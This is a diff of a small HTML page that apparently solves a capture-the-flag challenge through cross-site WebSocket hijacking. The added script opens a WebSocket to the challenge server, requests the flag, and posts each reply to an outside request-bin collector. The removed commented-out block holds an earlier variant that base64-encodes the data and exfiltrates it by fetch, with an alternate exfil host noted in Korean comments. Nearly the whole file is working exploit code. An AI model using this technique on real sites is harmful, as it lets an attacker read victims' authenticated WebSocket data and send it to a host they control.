@@ -1,33 +1,19 @@
+<!DOCTYPE html>
 <html>
-<head>
-  <title>Document</title>
-</head>
 <body>
-  <img src="https://ptzmvxk.request.dreamhack.games/?status=img" alt="" srcset="">  
+<script>
+  const socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
+
+  socket.onopen = () => {
+    socket.send(JSON.stringify({ message: "/getFlag" }));
+  };
+
+  socket.onmessage = (event) => {
+    fetch("https://ptzmvxk.request.dreamhack.games", {
+      method: "POST",
+      body: event.data
+    });
+  };
+</script>
 </body>
-
-  <!-- <script>
-  /* ---------- 0. 스크립트 실행 확인 ---------- */
-  fetch('https://kpqfufz.request.dreamhack.games/?status=loaded')
-    .catch(()=>{});
-
-  /* ---------- 1. WebSocket 열고 /getFlag 전송 ---------- */
-  const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
-
-  ws.addEventListener('open', () => {
-    ws.send(JSON.stringify({ message: '/getFlag' }));
-  });
-
-  /* ---------- 2. 플래그 수신 → 외부 서버로 전송 ---------- */
-  function exfil(tag, data) {
-    const payload = encodeURIComponent(btoa(data));      // base64 → URL-safe
-    fetch(`https://kpqfufz.request.dreamhack.games/?${tag}=${payload}`).catch(()=>{});
-    /* 혼합-콘텐츠 차단을 피하려면 HTTPS 엔드포인트만 사용하는 편이 안전합니다.
-      server.dottak.me 가 HTTPS를 지원한다면 아래 한 줄을 https:// 로 교체해 주십시오. */
-    // fetch(`http://server.dottak.me/?${tag}=${payload}`).catch(()=>{});
-  }
-
-  ws.addEventListener('message', ev => exfil('flag', ev.data));
-  ws.addEventListener('error',   ev => exfil('error', ev.message || 'ws_error'));
-  </script> -->
 </html>
